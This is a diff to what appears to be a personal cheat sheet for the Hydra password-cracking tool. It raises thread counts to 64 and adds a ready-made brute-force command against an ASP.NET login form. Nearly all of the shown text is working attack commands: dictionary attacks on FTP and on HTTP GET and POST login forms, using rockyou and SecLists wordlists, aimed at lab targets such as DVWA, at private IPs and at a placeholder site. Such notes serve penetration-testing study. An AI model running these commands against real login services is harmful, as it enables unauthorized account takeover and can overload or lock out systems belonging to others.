@@ -6,12 +6,12 @@ Good password lists to use are:
 - rockyou (this is too much in general for e.g., ssh)
 
 ## Example launch
-hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
+hydra -t 64 -l admin -P [path to password.lst] -vV [IPaddress] ftp
 --> -t <number> = use <number> threads
 --> -l NAME = try to log in with NAME
 --> -P [filepath] = Try password
 --> -vV = verbose mode, showing the login+pass for each attempt
---> -t 10 threads  
+--> -t 64 threads  
 --> -w 30 Wait for timeout
 --> -o output.txt generate report
 Output file = -o hydra-http-post-attack.txt
@@ -82,12 +82,12 @@ http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:User
 
 # HTTP Get Login Forms (Success String + Headers)
 hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt \
-  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
+  -e ns  -F  -u  -t 64  -w 10  -v  -V  192.168.1.44  http-get-form \
 "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
 
 # HTTP Post Login Forms
 hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" \
--L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+-L users.txt -P pass.txt -t 64 -w 30 -o hydra-http-post-attack.txt
 
 # HTTP Post Login Forms 
 ## in this case we specify that the cookie should be page/cookie
@@ -95,10 +95,14 @@ hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:
 ## and we also added an header with H= 
 ## this header is called X-Foo and has as value Foo
 hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
--L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
+-L users.txt -P pass.txt -t 64 -w 1 -o hydra-http-post-attack.txt
 
 # HTTP Post Login Forms (Fail String)
-hydra -L users.txt -P words.txt https://www.site.com https-post-form "/index.cgi:login&name=^USER^&password=^PASS^&login=Login:Not allowed" &
+hydra -L users.txt -P words.txt https://www.site.com https-post-form "/index.cgi:login&name=^USER^&password=^PASS^&login=Login:Not allowed"
+
+# HTTP Post Login Forms (Fail String) for .NET Apps
+;; 
+hydra -vV "10.10.213.123" http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=mJGeQiVdgJGanZ1Pme9ZO05dAuuqfSwyBuo7etqHtS7fCfBQVvMHC5OAHAx4TdqTOrKdjNImKdP%2BsN6EVhdQRZv2V%2FucHEwDa1MNadMlT0QldWd4VXZQwfvZZbCCNbR1nEue9h7NvntN%2Fii53DLXIcAhJBFiZa9%2BFJR0RdNQTwV6%2FWUN&__EVENTVALIDATION=FMalF7DuDUlHFgLDqKWoe0kDIwL1bMiHxMS7pgB8NWdH%2BIVFvHNu5o%2Fwlmbjbtathn8BsD2WvwL7Z5rB78LEOO%2FgJQ%2BzhEhaaiB6YBYYbWq7zChLPZoPd0rb2PA37AU15w9IcfX%2BVJyGkQgr%2FWrdiTmyyLro2jGPIYT%2BcBgc%2BfdGiDFf&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -l admin -P /usr/share/wordlists/passwords/rockyou.txt  -t 64
 
 # HTTP Post Login Forms
 ## now we check for success by using S=Location, since wordpress uses a Location
